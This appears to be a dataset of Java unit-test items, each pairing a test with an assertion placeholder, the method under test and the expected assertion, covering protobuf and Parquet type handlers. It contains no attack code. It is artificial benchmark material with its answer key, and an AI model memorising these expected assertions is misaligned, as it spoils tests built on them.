getTypeHandler(Descriptors.FieldDescriptor fieldDescriptor) { Optional<PrimitiveHandler> filteredTypeHandlers = getSpecificHandlers(fieldDescriptor) .stream() .filter(PrimitiveHandler::canHandle) .findFirst(); return filteredTypeHandlers.orElseThrow(() -> new DataTypeNotSupportedException(""Data type "" + fieldDescriptor.getJavaType() + "" not supported in primitive type handlers"")); }"	assertEquals(IntegerHandler.class, primitiveHandler.getClass())
"shouldReturnBooleanTypeHandlerForBoolean() { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory .getTypeHandler(TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled"")); ""<AssertPlaceHolder>""; }
getTypeHandler(Descriptors.FieldDescriptor fieldDescriptor) { Optional<PrimitiveHandler> filteredTypeHandlers = getSpecificHandlers(fieldDescriptor) .stream() .filter(PrimitiveHandler::canHandle) .findFirst(); return filteredTypeHandlers.orElseThrow(() -> new DataTypeNotSupportedException(""Data type "" + fieldDescriptor.getJavaType() + "" not supported in primitive type handlers"")); }"	assertEquals(BooleanHandler.class, primitiveHandler.getClass())
"shouldReturnDoubleTypeHandlerForDouble() { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory .getTypeHandler(TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount"")); ""<AssertPlaceHolder>""; }
getTypeHandler(Descriptors.FieldDescriptor fieldDescriptor) { Optional<PrimitiveHandler> filteredTypeHandlers = getSpecificHandlers(fieldDescriptor) .stream() .filter(PrimitiveHandler::canHandle) .findFirst(); return filteredTypeHandlers.orElseThrow(() -> new DataTypeNotSupportedException(""Data type "" + fieldDescriptor.getJavaType() + "" not supported in primitive type handlers"")); }"	assertEquals(DoubleHandler.class, primitiveHandler.getClass())
"shouldReturnFloatTypeHandlerForFloat() { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory .getTypeHandler(TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash"")); ""<AssertPlaceHolder>""; }
getTypeHandler(Descriptors.FieldDescriptor fieldDescriptor) { Optional<PrimitiveHandler> filteredTypeHandlers = getSpecificHandlers(fieldDescriptor) .stream() .filter(PrimitiveHandler::canHandle) .findFirst(); return filteredTypeHandlers.orElseThrow(() -> new DataTypeNotSupportedException(""Data type "" + fieldDescriptor.getJavaType() + "" not supported in primitive type handlers"")); }"	assertEquals(FloatHandler.class, primitiveHandler.getClass())
"shouldReturnLongTypeHandlerForLong() { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory .getTypeHandler(TestBookingLogMessage.getDescriptor().findFieldByName(""customer_total_fare_without_surge"")); ""<AssertPlaceHolder>""; }
getTypeHandler(Descriptors.FieldDescriptor fieldDescriptor) { Optional<PrimitiveHandler> filteredTypeHandlers = getSpecificHandlers(fieldDescriptor) .stream() .filter(PrimitiveHandler::canHandle) .findFirst(); return filteredTypeHandlers.orElseThrow(() -> new DataTypeNotSupportedException(""Data type "" + fieldDescriptor.getJavaType() + "" not supported in primitive type handlers"")); }"	assertEquals(LongHandler.class, primitiveHandler.getClass())
"shouldReturnStringTypeHandlerForString() { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory .getTypeHandler(TestBookingLogMessage.getDescriptor().findFieldByName(""order_number"")); ""<AssertPlaceHolder>""; }
getTypeHandler(Descriptors.FieldDescriptor fieldDescriptor) { Optional<PrimitiveHandler> filteredTypeHandlers = getSpecificHandlers(fieldDescriptor) .stream() .filter(PrimitiveHandler::canHandle) .findFirst(); return filteredTypeHandlers.orElseThrow(() -> new DataTypeNotSupportedException(""Data type "" + fieldDescriptor.getJavaType() + "" not supported in primitive type handlers"")); }"	assertEquals(StringHandler.class, primitiveHandler.getClass())
"shouldReturnByteStringTypeHandlerForByteString() { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory .getTypeHandler(TestMessageEnvelope.getDescriptor().findFieldByName(""log_key"")); ""<AssertPlaceHolder>""; }
getTypeHandler(Descriptors.FieldDescriptor fieldDescriptor) { Optional<PrimitiveHandler> filteredTypeHandlers = getSpecificHandlers(fieldDescriptor) .stream() .filter(PrimitiveHandler::canHandle) .findFirst(); return filteredTypeHandlers.orElseThrow(() -> new DataTypeNotSupportedException(""Data type "" + fieldDescriptor.getJavaType() + "" not supported in primitive type handlers"")); }"	assertEquals(ByteStringHandler.class, primitiveHandler.getClass())
"shouldHandleStringTypes() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); StringHandler stringHandler = new StringHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.STRING; }"	assertTrue(stringHandler.canHandle())
"shouldNotHandleTypesOtherThanString() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""service_type""); StringHandler stringHandler = new StringHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.STRING; }"	assertFalse(stringHandler.canHandle())
"shouldFetchValueForFieldForFieldDescriptorOfTypeString() { String actualValue = ""test"";  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); StringHandler stringHandler = new StringHandler(fieldDescriptor); Object value = stringHandler.parseObject(actualValue);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return getValueOrDefault(field, """"); }"	assertEquals(actualValue, value)
"shouldFetchParsedValueForFieldForFieldDescriptorOfTypeString() { Integer actualValue = 23;  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); StringHandler stringHandler = new StringHandler(fieldDescriptor); Object value = stringHandler.parseObject(actualValue);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return getValueOrDefault(field, """"); }"	"assertEquals(""23"", value)"
"shouldFetchDefaultValueIfValueNotPresentForFieldDescriptorOfTypeString() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); StringHandler stringHandler = new StringHandler(fieldDescriptor); Object value = stringHandler.parseObject(null);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return getValueOrDefault(field, """"); }"	"assertEquals("""", value)"
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); StringHandler stringHandler = new StringHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeInformation() { return Types.STRING; }"	assertEquals(Types.STRING, stringHandler.getTypeInformation())
"shouldReturnArrayTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); StringHandler stringHandler = new StringHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getArrayType() { return ObjectArrayTypeInfo.getInfoFor(Types.STRING); }"	assertEquals(ObjectArrayTypeInfo.getInfoFor(Types.STRING), stringHandler.getArrayType())
"shouldReturnArrayValues() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); StringHandler stringHandler = new StringHandler(fieldDescriptor); ArrayList<String> inputValues = new ArrayList<>(Arrays.asList(""1"", ""2"", ""3"")); Object actualValues = stringHandler.parseRepeatedObjectField(inputValues); ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { List<String> inputValues = new ArrayList<>(); if (field != null) { inputValues = (List<String>) field; } return inputValues.toArray(new String[]{}); }"	assertArrayEquals(inputValues.toArray(), (String[]) actualValues)
"shouldReturnEmptyArrayOnNull() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); StringHandler stringHandler = new StringHandler(fieldDescriptor); Object actualValues = stringHandler.parseRepeatedObjectField(null); ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { List<String> inputValues = new ArrayList<>(); if (field != null) { inputValues = (List<String>) field; } return inputValues.toArray(new String[]{}); }"	assertEquals(0, ((String[]) actualValues).length)
"shouldFetchParsedValueForFieldOfTypeStringInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BINARY).named(""order_number"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""order_number"", ""some-value""); StringHandler stringHandler = new StringHandler(fieldDescriptor);  Object actualValue = stringHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getString(fieldName, 0); } else { /* return default value */ return """"; } }"	"assertEquals(""some-value"", actualValue)"
"shouldFetchDefaultValueIfFieldNotPresentInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BINARY).named(""some-other-field"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); StringHandler stringHandler = new StringHandler(fieldDescriptor);  Object actualValue = stringHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getString(fieldName, 0); } else { /* return default value */ return """"; } }"	"assertEquals("""", actualValue)"
"shouldFetchDefaultValueIfFieldNotInitializedWithAValueInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); /* The field is added to the schema but not assigned a value */ GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BINARY).named(""order_number"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); StringHandler stringHandler = new StringHandler(fieldDescriptor);  Object actualValue = stringHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getString(fieldName, 0); } else { /* return default value */ return """"; } }"	"assertEquals("""", actualValue)"
"shouldReturnArrayOfStringValuesForFieldOfTypeRepeatedBinaryInsideSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array"");  GroupType parquetSchema = buildMessage() .repeated(BINARY).named(""meta_array"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  simpleGroup.add(""meta_array"", ""Hello World""); simpleGroup.add(""meta_array"", ""Welcome"");  StringHandler stringHandler = new StringHandler(fieldDescriptor); String[] actualValue = (String[]) stringHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); String[] stringArray = new String[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { stringArray[i] = simpleGroup.getString(fieldName, i); } return stringArray; } return new String[0]; }"	"assertArrayEquals(new String[]{""Hello World"", ""Welcome""}, actualValue)"
"shouldReturnEmptyStringArrayWhenParseRepeatedSimpleGroupFieldIsCalledWithNull() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array"");  StringHandler stringHandler = new StringHandler(fieldDescriptor); String[] actualValue = (String[]) stringHandler.parseRepeatedSimpleGroupField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); String[] stringArray = new String[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { stringArray[i] = simpleGroup.getString(fieldName, i); } return stringArray; } return new String[0]; }"	assertArrayEquals(new String[0], actualValue)
"shouldReturnEmptyStringArrayWhenRepeatedBinaryFieldInsideSimpleGroupIsNotPresent() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array"");  GroupType parquetSchema = buildMessage() .repeated(BOOLEAN).named(""some_other_field"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  StringHandler stringHandler = new StringHandler(fieldDescriptor); String[] actualValue = (String[]) stringHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); String[] stringArray = new String[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { stringArray[i] = simpleGroup.getString(fieldName, i); } return stringArray; } return new String[0]; }"	assertArrayEquals(new String[0], actualValue)
"shouldReturnEmptyStringArrayWhenRepeatedBinaryFieldInsideSimpleGroupIsNotInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array"");  GroupType parquetSchema = buildMessage() .repeated(BINARY).named(""meta_array"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  StringHandler stringHandler = new StringHandler(fieldDescriptor); String[] actualValue = (String[]) stringHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); String[] stringArray = new String[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { stringArray[i] = simpleGroup.getString(fieldName, i); } return stringArray; } return new String[0]; }"	assertArrayEquals(new String[0], actualValue)
"shouldReturnTrueIfRepeatedEnumFieldDescriptorIsPassed() { Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(repeatedEnumFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == ENUM && fieldDescriptor.isRepeated(); }"	assertTrue(repeatedEnumHandler.canHandle())
"shouldReturnFalseIfEnumFieldDescriptorIsPassed() { Descriptors.FieldDescriptor enumFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""service_type""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(enumFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == ENUM && fieldDescriptor.isRepeated(); }"	assertFalse(repeatedEnumHandler.canHandle())
"shouldReturnFalseIfFieldDescriptorOtherThanRepeatedEnumTypeIsPassed() { Descriptors.FieldDescriptor otherFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(otherFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == ENUM && fieldDescriptor.isRepeated(); }"	assertFalse(repeatedEnumHandler.canHandle())
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(repeatedEnumFieldDescriptor); TypeInformation actualTypeInformation = repeatedEnumHandler.getTypeInformation(); TypeInformation<String[]> expectedTypeInformation = ObjectArrayTypeInfo.getInfoFor(Types.STRING); ""<AssertPlaceHolder>""; }
getTypeInformation() { return ObjectArrayTypeInfo.getInfoFor(Types.STRING); }"	assertEquals(expectedTypeInformation, actualTypeInformation)
"shouldTransformValueForPostProcessorAsEmptyStringArrayForNull() { Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(repeatedEnumFieldDescriptor);  String[] outputValues = (String[]) repeatedEnumHandler.transformFromPostProcessor(null);  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { return getValue(field); }"	assertEquals(0, outputValues.length)
"InvalidProtocolBufferException { TestRepeatedEnumMessage testRepeatedEnumMessage = TestRepeatedEnumMessage.newBuilder().addTestEnums(TestEnumMessage.Enum.UNKNOWN).build(); DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestRepeatedEnumMessage.getDescriptor(), testRepeatedEnumMessage.toByteArray());  Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(repeatedEnumFieldDescriptor);  String[] outputValues = (String[]) repeatedEnumHandler.transformFromProto(dynamicMessage.getField(repeatedEnumFieldDescriptor));  ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { return getValue(field); }"	"assertEquals(""UNKNOWN"", outputValues[0])"
"shouldTransformValueFromProtoAsEmptyStringArrayForNull() { Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(repeatedEnumFieldDescriptor);  String[] outputValues = (String[]) repeatedEnumHandler.transformFromProto(null);  ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { return getValue(field); }"	assertEquals(0, outputValues.length)
"InvalidProtocolBufferException { TestRepeatedEnumMessage testRepeatedEnumMessage = TestRepeatedEnumMessage.newBuilder().addTestEnums(TestEnumMessage.Enum.UNKNOWN).build(); DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestRepeatedEnumMessage.getDescriptor(), testRepeatedEnumMessage.toByteArray());  Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(repeatedEnumFieldDescriptor); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestRepeatedEnumMessage.getDescriptor());  String[] outputValues = (String[]) repeatedEnumHandler.transformFromProtoUsingCache(dynamicMessage.getField(repeatedEnumFieldDescriptor), fieldDescriptorCache);  ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { return getValue(field); }"	"assertEquals(""UNKNOWN"", outputValues[0])"
"shouldTransformValueFromProtoUsingCacheAsEmptyStringArrayForNull() { Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(repeatedEnumFieldDescriptor); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestRepeatedEnumMessage.getDescriptor());  String[] outputValues = (String[]) repeatedEnumHandler.transformFromProtoUsingCache(null, fieldDescriptorCache);  ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { return getValue(field); }"	assertEquals(0, outputValues.length)
"shouldTransformValueForParquetAsEmptyStringArrayWhenNullIsPassedAsArgument() { Descriptors.FieldDescriptor fieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(fieldDescriptor);  String[] expectedEnumArray = (String[]) repeatedEnumHandler.transformFromParquet(null);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String defaultEnumValue = fieldDescriptor.getEnumType().findValueByNumber(0).getName(); List<String> enumArrayList = new ArrayList<>(); String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int positionIndex = 0; positionIndex < repetitionCount; positionIndex++) { String extractedValue = simpleGroup.getString(fieldName, positionIndex); Descriptors.EnumValueDescriptor enumValueDescriptor = fieldDescriptor.getEnumType().findValueByName(extractedValue); String enumValue = enumValueDescriptor == null ? defaultEnumValue : enumValueDescriptor.getName(); enumArrayList.add(enumValue); } } return enumArrayList.toArray(new String[]{}); }"	assertArrayEquals(new String[0], expectedEnumArray)
"shouldTransformValueForParquetAsEmptyStringArrayWhenFieldIsNotPresentInsideSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(fieldDescriptor);  GroupType parquetSchema = buildMessage() .repeated(INT64).named(""first_name"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""first_name"", 34L);  String[] actualEnumArray = (String[]) repeatedEnumHandler.transformFromParquet(simpleGroup);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String defaultEnumValue = fieldDescriptor.getEnumType().findValueByNumber(0).getName(); List<String> enumArrayList = new ArrayList<>(); String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int positionIndex = 0; positionIndex < repetitionCount; positionIndex++) { String extractedValue = simpleGroup.getString(fieldName, positionIndex); Descriptors.EnumValueDescriptor enumValueDescriptor = fieldDescriptor.getEnumType().findValueByName(extractedValue); String enumValue = enumValueDescriptor == null ? defaultEnumValue : enumValueDescriptor.getName(); enumArrayList.add(enumValue); } } return enumArrayList.toArray(new String[]{}); }"	assertArrayEquals(new String[0], actualEnumArray)
"shouldTransformValueForParquetAsEmptyStringArrayWhenFieldIsNotInitializedInsideSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedEnumHandler repeatedEnumHandler = new RepeatedEnumHandler(fieldDescriptor);  GroupType parquetSchema = buildMessage() .repeated(BINARY).named(""test_enums"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  String[] actualEnumArray = (String[]) repeatedEnumHandler.transformFromParquet(simpleGroup);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String defaultEnumValue = fieldDescriptor.getEnumType().findValueByNumber(0).getName(); List<String> enumArrayList = new ArrayList<>(); String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int positionIndex = 0; positionIndex < repetitionCount; positionIndex++) { String extractedValue = simpleGroup.getString(fieldName, positionIndex); Descriptors.EnumValueDescriptor enumValueDescriptor = fieldDescriptor.getEnumType().findValueByName(extractedValue); String enumValue = enumValueDescriptor == null ? defaultEnumValue : enumValueDescriptor.getName(); enumArrayList.add(enumValue); } } return enumArrayList.toArray(new String[]{}); }"	assertArrayEquals(new String[0], actualEnumArray)
"shouldReturnTrueIfRepeatedPrimitiveFieldDescriptorIsPassed() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.isRepeated() && fieldDescriptor.getJavaType() != MESSAGE && fieldDescriptor.getJavaType() != ENUM; }"	assertTrue(repeatedPrimitiveHandler.canHandle())
"shouldReturnFalseIfRepeatedMessageFieldDescriptorIsPassed() { Descriptors.FieldDescriptor repeatedMessageFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""routes""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedMessageFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.isRepeated() && fieldDescriptor.getJavaType() != MESSAGE && fieldDescriptor.getJavaType() != ENUM; }"	assertFalse(repeatedPrimitiveHandler.canHandle())
"shouldReturnFalseIfRepeatedEnumFieldDescriptorIsPassed() { Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedEnumFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.isRepeated() && fieldDescriptor.getJavaType() != MESSAGE && fieldDescriptor.getJavaType() != ENUM; }"	assertFalse(repeatedPrimitiveHandler.canHandle())
"shouldReturnFalseIfFieldDescriptorOtherThanTypeIsPassed() { Descriptors.FieldDescriptor otherFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(otherFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.isRepeated() && fieldDescriptor.getJavaType() != MESSAGE && fieldDescriptor.getJavaType() != ENUM; }"	assertFalse(repeatedPrimitiveHandler.canHandle())
"shouldReturnSameBuilderWithoutSettingFieldIfCannotHandle() { Descriptors.FieldDescriptor otherFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(otherFieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(otherFieldDescriptor.getContainingType());  DynamicMessage.Builder returnedBuilder = repeatedPrimitiveHandler.transformToProtoBuilder(builder, ""123""); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } if (field.getClass().isArray()) { field = Arrays.asList((Object[]) field); } return builder.setField(fieldDescriptor, field); }"	"assertEquals("""", returnedBuilder.getField(otherFieldDescriptor))"
"shouldReturnSameBuilderWithoutSettingFieldIfNullFieldIsPassed() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(repeatedFieldDescriptor.getContainingType());  DynamicMessage.Builder returnedBuilder = repeatedPrimitiveHandler.transformToProtoBuilder(builder, null); List<Object> outputValues = (List<Object>) returnedBuilder.getField(repeatedFieldDescriptor); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } if (field.getClass().isArray()) { field = Arrays.asList((Object[]) field); } return builder.setField(fieldDescriptor, field); }"	assertEquals(0, outputValues.size())
"shouldSetEmptyListInBuilderIfEmptyListIfPassed() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(repeatedFieldDescriptor.getContainingType());  ArrayList<String> inputValues = new ArrayList<>();  DynamicMessage.Builder returnedBuilder = repeatedPrimitiveHandler.transformToProtoBuilder(builder, inputValues); List<String> outputValues = (List<String>) returnedBuilder.getField(repeatedFieldDescriptor); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } if (field.getClass().isArray()) { field = Arrays.asList((Object[]) field); } return builder.setField(fieldDescriptor, field); }"	assertEquals(0, outputValues.size())
"shouldSetFieldPassedInTheBuilderAsAList() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(repeatedFieldDescriptor.getContainingType());  ArrayList<String> inputValues = new ArrayList<>(); inputValues.add(""test1""); inputValues.add(""test2"");  DynamicMessage.Builder returnedBuilder = repeatedPrimitiveHandler.transformToProtoBuilder(builder, inputValues); List<String> outputValues = (List<String>) returnedBuilder.getField(repeatedFieldDescriptor); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } if (field.getClass().isArray()) { field = Arrays.asList((Object[]) field); } return builder.setField(fieldDescriptor, field); }"	"assertEquals(asList(""test1"", ""test2""), outputValues)"
